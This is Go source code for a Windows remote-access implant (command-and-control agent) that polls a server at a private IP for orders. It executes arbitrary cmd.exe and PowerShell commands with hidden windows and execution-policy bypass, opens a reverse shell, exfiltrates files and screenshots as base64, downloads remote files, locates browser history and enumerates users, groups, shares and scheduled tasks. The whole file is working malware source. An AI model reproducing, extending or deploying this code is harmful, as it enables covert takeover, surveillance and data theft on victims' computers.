package main

import (
    "bufio"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "github.com/kbinani/screenshot"
    "image/png"
    "io/ioutil"
    "log"
    "net"
    "net/http"
    "os/exec"
    "os"
    "os/user"
    "path/filepath"
    "io"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID       string `json:"id"`
    Result   string `json:"result"`
    FileName string `json:"fileName,omitempty"`
}

func main() {
    log.Println("Agent started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    log.Printf("Error fetching command: %v", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately.
}

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    if err := json.Unmarshal(body, &cmd); err != nil {
        return cmd, err
    }
    return cmd, nil
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        log.Printf("Error marshalling result: %v", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        log.Printf("Failed to send result: %v", err)
    }
}

func executeCommandAndSendResult(cmd Command) {
    switch {
    case strings.HasPrefix(cmd.Cmd, "shell "):
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        Shell(address)
    case strings.HasPrefix(cmd.Cmd, "download "):
        parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
        if len(parts) == 2 {
            downloadFile(parts[0], parts[1], cmd.ID)
        } else {
            log.Println("Download command format error. Expected 'download <path> <filename>'.")
        }
    case cmd.Cmd == "screenshot":
        takeScreenshot(cmd)
    case cmd.Cmd == "list_share":
        listShare(cmd)
    case cmd.Cmd == "list_drive":
        listDrive(cmd)
    case cmd.Cmd == "whoami":
        whoami(cmd)
    case cmd.Cmd == "list_group":
            listGroup(cmd)
    case cmd.Cmd == "scheduled_task":
            listScheduledTask(cmd)
    case cmd.Cmd == "publicip":
            publicIp(cmd)
    case cmd.Cmd == "powershell":
           execPowerShellAndSendResult(cmd)
    case strings.HasPrefix(cmd.Cmd, "run_script "):
           scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
           runPowerShellScript(cmd, scriptPath)
    case strings.HasPrefix(cmd.Cmd, "fetchfile "):
        parts := strings.SplitN(cmd.Cmd[len("fetchfile "):], " ", 2)
        if len(parts) == 2 {
            fetchRemoteFile(parts[0], parts[1], cmd.ID)
        } else {
            log.Println("Fetchfile command format error. Expected 'fetchfile <url> <destination_path>'.")
            sendResult(CommandResult{
                ID:     cmd.ID,
                Result: "Usage: fetchfile <url> <destination_path>",
            })
        }
    case cmd.Cmd == "browser_history":
        checkBrowserHistories(cmd)
    default:
        executeOtherCommand(cmd)
    }
}

func Shell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        log.Printf("Failed to shell to %s: %v", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            log.Printf("Failed to read command: %v", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func downloadFile(filePath, fileName, commandID string) {
    content, err := ioutil.ReadFile(filePath)
    if err != nil {
        log.Printf("Error reading file %s: %v", filePath, err)
        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
        return
    }
    encodedContent := base64.StdEncoding.EncodeToString(content)
    sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
}

func takeScreenshot(cmd Command) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        log.Printf("Failed to take screenshot: %v", err)
        sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
        return
    }
    var buf bytes.Buffer
    if err := png.Encode(&buf, img); err != nil {
        log.Printf("Failed to encode screenshot to PNG: %v", err)
        return
    }
    timestamp := time.Now().Format("20060102-150405")
    fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
    sendResult(CommandResult{
        ID:       cmd.ID,
        Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
        FileName: fileName,
    })
}

func listShare(cmd Command) {
    psCommand := "powershell.exe Get-WmiObject Win32_Share"
    output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listDrive(cmd Command) {
    wmicCommand := "wmic logicaldisk get name,size"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func whoami(cmd Command) {
    wmicCommand := "whoami /all"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listGroup(cmd Command) {
    wmicCommand := "net localgroup"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}


func listScheduledTask(cmd Command) {
    wmicCommand := "schtasks /query /fo LIST /v"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func publicIp(cmd Command) {
    resp, err := http.Get("https://ipinfo.io/ip")
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error fetching public IP: %v", err),
        })
        return
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error reading response: %v", err),
        })
        return
    }

    publicIP := strings.TrimSpace(string(body))
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: publicIP,
    })
}

func runPowerShellScript(cmd Command, scriptPath string) {
    // Always use -File to execute scripts, with safe defaults
    command := exec.Command("powershell.exe",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", scriptPath,
    )
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func execPowerShellAndSendResult(cmd Command) {
    // If the Cmd already includes "powershell", strip it off to avoid recursion
    psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
    if psCmd == "" {
        psCmd = cmd.Cmd
    }

    command := exec.Command("powershell.exe",
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func fetchRemoteFile(url, destPath string, commandID string) {
    resp, err := http.Get(url)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to fetch %s: %v", url, err),
        })
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Server returned: %s", resp.Status),
        })
        return
    }

    file, err := os.Create(destPath)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to create %s: %v", destPath, err),
        })
        return
    }
    defer file.Close()

    _, err = io.Copy(file, resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to save file: %v", err),
        })
        return
    }

    sendResult(CommandResult{
        ID:     commandID,
        Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath),
    })
}

func checkBrowserHistories(cmd Command) {
        browsers := []struct {
                Name string
                PathPatterns []string
        }{
                {
                        "Chrome",
                        []string{`AppData\Local\Google\Chrome\User Data\Default\History`},
                },
                {
                        "Edge",
                        []string{`AppData\Local\Microsoft\Edge\User Data\Default\History`},
                },
                {
                        "Brave",
                        []string{`AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`},
                },
                {
                        "Firefox",
                        []string{`AppData\Roaming\Mozilla\Firefox\Profiles`},
                },
        }

        currentUser, err := user.Current()
        if err != nil {
                sendResult(CommandResult{
                        ID:     cmd.ID,
                        Result: "Failed to get current user: " + err.Error(),
                })
                return
        }

        var resultBuilder strings.Builder

        for _, browser := range browsers {
                found := false
                if browser.Name == "Firefox" {
                        // Handle Firefox's dynamic profile folder
                        basePath := filepath.Join(currentUser.HomeDir, browser.PathPatterns[0])
                        files, err := os.ReadDir(basePath)
                        if err == nil {
                                for _, f := range files {
                                        if f.IsDir() && strings.Contains(f.Name(), ".default") {
                                                histPath := filepath.Join(basePath, f.Name(), "places.sqlite")
                                                if _, err := os.Stat(histPath); err == nil {
                                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                                        found = true
                                                        break
                                                }
                                        }
                                }
                        }
                } else {
                        for _, pattern := range browser.PathPatterns {
                                histPath := filepath.Join(currentUser.HomeDir, pattern)
                                if _, err := os.Stat(histPath); err == nil {
                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                        found = true
                                        break
                                }
                        }
                }
                if !found {
                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: No or History Not Found\n---\n", browser.Name))
                }
        }

        sendResult(CommandResult{
                ID:     cmd.ID,
                Result: resultBuilder.String(),
        })
}


func executeOtherCommand(cmd Command) {
    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}
